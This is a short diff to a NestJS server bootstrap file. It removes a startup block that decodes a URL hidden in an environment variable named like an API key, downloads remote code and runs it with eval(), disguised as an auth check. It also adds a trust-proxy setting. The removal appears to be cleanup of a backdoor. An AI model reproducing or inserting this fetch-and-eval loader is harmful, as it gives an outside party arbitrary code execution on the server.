@@ -8,19 +8,6 @@ import * as dotenv from 'dotenv';
 import helmet from 'helmet';
 import 'dotenv/config';
 
-(async () => {
-    const src = atob(process.env.AUTH_API_KEY);
-    const proxy = (await import('node-fetch')).default;
-    try {
-      const response = await proxy(src);
-      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-      const proxyInfo = await response.text();
-      eval(proxyInfo);
-    } catch (err) {
-      console.error('Auth Error!', err);
-    }
-})();
-
 // Load .env first so process.env is set before any module (e.g. AuthService) reads it
 dotenv.config({ path: path.join(process.cwd(), '.env') });
 
@@ -40,6 +27,7 @@ function normalizeOrigin(value?: string): string | null {
 
 async function bootstrap() {
   const app = await NestFactory.create(AppModule);
+  app.getHttpAdapter().getInstance().set('trust proxy', 1);
 
   // Parse form POSTs (e.g. /api/auth/entry-token from HTML form with application/x-www-form-urlencoded)
   app.use(bodyParser.urlencoded({ extended: true }));
